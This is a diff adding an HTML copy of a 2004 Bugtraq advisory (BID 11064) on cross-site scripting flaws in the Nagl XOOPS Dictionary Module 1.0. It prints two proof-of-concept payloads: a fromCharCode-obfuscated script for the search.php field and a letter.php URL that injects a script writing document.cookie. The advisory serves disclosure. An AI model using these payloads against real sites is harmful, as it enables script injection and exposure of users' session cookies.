@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid11064<p><b><span style="font-size: 18pt;">Nagl XOOPS Dictionary Module Multiple Cross-Site Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11064/info">info</a><br><a href="http://www.securityfocus.com/bid/11064/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11064/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11064/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11064/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11064
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 28 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 28 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Disclosure of this issue is credited to CyruxNET &lt;cyruxnet@cyruxnet.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Nagl XOOPS Dictionary Module 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage this issue.  The following proof of concept has been provided:<br/><br/>The following script passed to the 'search' field of the 'search.php' script will reportedly trigger this issue:<br/>script&gt;<br/>function xss (){<br/>var tag=String.fromCharCode(60)+String.fromCharCode(105)+<br/>String.fromCharCode(109)+String.fromCharCode(103)+String.fromCharCode(32)+<br/>String.fromCharCode(115)+String.fromCharCode(114)+String.fromCharCode(99)+<br/>String.fromCharCode(32)+String.fromCharCode(61);<br/>var web=String.fromCharCode(104)+String.fromCharCode(116)+<br/>String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+<br/>String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(119)+<br/>String.fromCharCode(119)+String.fromCharCode(119)+String.fromCharCode(46)+<br/>String.fromCharCode(103)+String.fromCharCode(111)+String.fromCharCode(111)+<br/>String.fromCharCode(103)+String.fromCharCode(108)+String.fromCharCode(101)+<br/>String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+<br/>String.fromCharCode(109);<br/>var path=String.fromCharCode(47)+String.fromCharCode(105)+<br/>String.fromCharCode(109)+String.fromCharCode(97)+String.fromCharCode(103)+<br/>String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(47)+<br/>String.fromCharCode(103)+String.fromCharCode(111)+String.fromCharCode(111)+<br/>String.fromCharCode(103)+String.fromCharCode(108)+String.fromCharCode(101)+<br/>String.fromCharCode(95)+String.fromCharCode(56)+String.fromCharCode(48)+<br/>String.fromCharCode(119)+String.fromCharCode(104)+String.fromCharCode(116)+<br/>String.fromCharCode(46)+String.fromCharCode(103)+String.fromCharCode(105)+<br/>String.fromCharCode(102)+String.fromCharCode(62);<br/>document.write(tag+web+path);<br/>} xss()<br/>&lt;/script&gt;<br/><br/>The following proof of concept has been provided for the 'letter.php' script issue:<br/><br/>ttp://attaker/modules/dictionary/letter.php?letter="&gt;&lt;script&gt;document.write(document.cookie)&lt;script&gt;(
+	
+		<ul>
+</ul>
+</div>
